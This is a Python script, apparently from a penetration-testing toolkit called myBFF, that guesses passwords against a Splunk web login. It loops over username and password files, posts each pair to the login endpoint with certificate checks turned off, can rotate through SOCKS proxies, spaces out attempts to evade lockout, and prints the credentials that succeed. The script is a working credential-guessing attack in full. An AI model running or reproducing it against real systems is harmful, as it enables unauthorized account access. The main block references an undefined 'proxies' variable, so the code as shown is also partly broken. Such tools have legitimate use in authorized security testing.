#! /usr/bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from requests import session
import requests
import re
from argparse import ArgumentParser
import time
import sys
import random
import proxySelector

parser = ArgumentParser(description='Attack Splunk Login')
parser.add_argument('--username', '-u', required=True, help='Username')
parser.add_argument('--userfile', '-U', help='Username File')
parser.add_argument('--password', '-p', required=True, help='Password')
parser.add_argument('--passfile', '-P', help='Password File')
parser.add_argument('--url', required=True, help='URL (Format: http://127.0.0.1:8000)')
parser.add_argument('--proxies', help='Comma-separated list of SOCKS proxies. (i.e., 127.0.0.1:9050,127.0.0.1:18085)')
parser.add_argument('--delay', '-d', default=60, help='Time delay (in seconds) between each password guess. (Used for password file only. Defaults to 60 seconds.)')

class SplunkBrute:
    def somethingCool(self):
        print("We will do something cool....eventually!")

    def connectTest(self, username, password, payload, url, cookies, proxies):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            proxyselector = proxySelector.proxySelector()
            proxy = proxyselector.proxySelect(proxies)
            if 'None' in str(proxy):
                cpost = c.post(url + '/en-US/account/login', data=payload, cookies=cookies, allow_redirects=True, verify=False)
            else:
                cpost = c.post(url + '/en-US/account/login', data=payload, cookies=cookies, allow_redirects=True, verify=False, proxies=proxy)
            if "status\":0" in cpost.text: #What constitutes a valid login?
                print("[+]  User Credentials Successful: " + username + ":" + password)
                print("[!] Time to do something cool!")
                self.somethingCool() #Do something cool, cause, why not?
            else:
                print("[-]  Login Failed for: " + username + ":" + password)

    def main(self, url, username, password, proxies, user_file, pass_file, delay):
        # Setup Cookie info if needed
        cookies = {
            "cval":"4"
            }
        if pass_file:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(pass_file)]
            for pass_line in pass_lines:
                        if user_file:
                            lines = [line.rstrip('\n') for line in open(user_file)]
                            for line in lines:
                                username = line.strip('\n')
                                password = pass_line.strip('\n')
                                # Setup payload values
                                payload = {
                                    "cval":"4",
                                    "username":username,
                                    "password":password
                                    }
                                # Try to connect to see if valid login
                                self.connectTest(username, password, payload, url, cookies, proxies)
                            # Wait XX seconds to try next password loop (defaults to 60 seconds, configurable with --delay)
                            time.sleep(float(delay))
                        else:
                            password = pass_line.strip('\n')
                            # Setup payload values
                            payload = {
                                "cval":"4",
                                "username":username,
                                "password":password
                                }
                            # Try to connect to see if valid login
                            self.connectTest(username, password, payload, url, cookies, proxies)
                            # Wait XX seconds to try next password loop (defaults to 60 seconds, configurable with --delay)
                            time.sleep(float(delay))
        elif user_file:
            lines = [line.rstrip('\n') for line in open(user_file)]
            for line in lines:
                username = line.strip('\n')
                # Setup payload values
                payload = {
                    "cval":"4",
                    "username":username,
                    "password":password
                    }
                # Try to connect to see if valid login
                self.connectTest(username, password, payload, url, cookies, proxies)
        else:
            # Setup payload values
            payload = {
                "cval":"4",
                "username":username,
                "password":password
                }
            # Try to connect to see if valid login
            self.connectTest(username, password, payload, url, cookies, proxies)

if __name__ == "__main__":
    args = parser.parse_args()
    # Setup arguments
    username = args.username
    password = args.password
    user_file = args.userfile
    pass_file = args.passfile
    delay = args.delay
    url = args.url
    s = SplunkBrute()
    s.main(url, username, password, proxies, user_file, pass_file, delay)
